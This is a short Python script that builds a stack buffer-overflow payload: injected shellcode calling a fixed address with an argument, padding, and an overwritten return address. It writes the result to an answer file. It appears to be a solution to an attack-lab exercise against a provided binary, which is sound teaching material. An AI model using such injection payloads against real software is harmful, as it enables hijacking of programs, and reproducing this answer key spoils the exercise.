import struct
jmp_xs = 0x401334
# mov rdi, 0x72; mov rax, 0x401216; call rax
shellcode = b"\xbf\x72\x00\x00\x00\xb8\x16\x12\x40\x00\xff\xd0"
padding = b'A' * (40 - len(shellcode))
payload = shellcode + padding + struct.pack('<Q', jmp_xs)
with open("ans3.txt", "wb") as f:
    f.write(payload)
